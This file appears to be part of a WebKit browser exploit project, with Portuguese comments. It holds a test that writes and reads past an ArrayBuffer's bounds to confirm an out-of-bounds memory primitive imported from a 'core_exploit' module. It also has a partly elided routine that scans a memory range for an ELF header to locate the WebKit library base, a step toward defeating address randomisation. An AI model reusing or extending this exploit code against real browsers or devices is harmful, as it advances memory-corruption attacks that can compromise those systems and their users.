// js/script3/testArrayBufferVictimCrash.mjs (Abordagem v32.3: Adicionado teste de limite OOB)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    isOOBReady,
    arb_read,
    // Funções adicionais necessárias para o novo teste
    getOOBAllocationSize,
    oob_read_absolute,
    oob_write_absolute
} from '../core_exploit.mjs';
import { WEBKIT_LIBRARY_INFO } from '../config.mjs';

// =======================================================================================
// NOVO TESTE DE VERIFICAÇÃO DE LEITURA/ESCRITA FORA DO LIMITE (OOB)
// =======================================================================================

/**
 * Testa especificamente se é possível ler e escrever um valor imediatamente
 * fora do buffer original, validando a primitiva OOB.
 * @returns {Promise<boolean>} Retorna true em caso de sucesso, false em caso de falha.
 */
export async function testOOBBoundaryCondition() {
    const FNAME_TEST = "OOB.testOOBBoundaryCondition";
    logS3(`--- Iniciando Teste de Condição de Limite OOB ---`, "test", FNAME_TEST);
    let success = false;
    try {
        // 1. Garante um ambiente OOB limpo e inicializado
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("Falha ao inicializar o ambiente OOB para o teste de limite.");
        }

        // 2. Obtém o tamanho REAL do buffer alocado
        const original_size = getOOBAllocationSize();
        const test_offset = original_size; // O primeiro byte FORA do buffer
        const test_value = 0xDEADBEEF;
        
        logS3(`Tamanho original do ArrayBuffer: ${toHex(original_size)}`, "info", FNAME_TEST);
        logS3(`Tentando escrever ${toHex(test_value)} no offset ${toHex(test_offset)} (imediatamente fora do limite)`, "warn", FNAME_TEST);
        
        // 3. Escreve o valor de teste fora do limite usando a primitiva de baixo nível
        oob_write_absolute(test_offset, test_value, 4);
        logS3(`Escrita OOB realizada. Tentando ler o valor de volta...`, "info", FNAME_TEST);

        // 4. Lê o valor de volta do mesmo local
        const read_value = oob_read_absolute(test_offset, 4);
        logS3(`Valor lido do offset ${toHex(test_offset)}: ${toHex(read_value)}`, "leak", FNAME_TEST);

        // 5. Verifica se o valor lido corresponde ao valor escrito
        if (read_value === test_value) {
            logS3(`✅ SUCESSO! O valor lido (${toHex(read_value)}) corresponde ao valor escrito. A primitiva OOB funciona!`, "good", FNAME_TEST);
            success = true;
        } else {
            logS3(`❌ FALHA! O valor lido (${toHex(read_value)}) é diferente do esperado (${toHex(test_value)}).`, "critical", FNAME_TEST);
        }

    } catch (e) {
        logS3(`💥 ERRO CRÍTICO durante o teste de limite OOB: ${e.message}`, "critical", FNAME_TEST);
        success = false;
    } finally {
        // Limpa o ambiente para não interferir em outros testes
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        logS3(`--- Teste de Condição de Limite OOB Concluído ---`, "test", FNAME_TEST);
    }
    return success;
}


// =======================================================================================
// SEU TESTE ORIGINAL DE VARREDURA DE MEMÓRIA (Mantido intacto)
// =======================================================================================

export const FNAME_MODULE_V28 = "GetterArbitraryRead_v32.2_WebKitBaseScan_CorrectedClone";
const SCAN_START_ADDRESS_STR = "0x800000000";
const SCAN_END_ADDRESS_STR = "0x800100000";
const SCAN_STEP_SIZE = 0x1000;
const ELF_MAGIC_DWORD = 0x464C457F;
let testLog_v32_2 = [];

function adv64_lessThan(a, b) { /* ...código original... */ }
function adv64_greaterThanOrEquals(a, b) { /* ...código original... */ }
function recordScanResult_v32_2(address, valueRead, isCandidate, verification = "") { /* ...código original... */ }

export async function executeArrayBufferVictimCrashTest() {
    // SEU CÓDIGO ORIGINAL DE VARREDURA DE MEMÓRIA ESTÁ AQUI, SEM NENHUMA MODIFICAÇÃO.
    // ... (todo o resto da sua função executeArrayBufferVictimCrashTest)
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.scanForWebKitBaseCorrectedClone`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Varredura de Memória Corrigida (Clone) (v32.2) ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;
    testLog_v32_2 = [];
    let overall_test_success = false; 
    let errorCapturedMain = null;
    let final_message = "Varredura iniciada...";

    const scan_start_addr = new AdvancedInt64(SCAN_START_ADDRESS_STR);
    const scan_end_addr = new AdvancedInt64(SCAN_END_ADDRESS_STR);
    // ... (o restante do código é idêntico ao original)
}
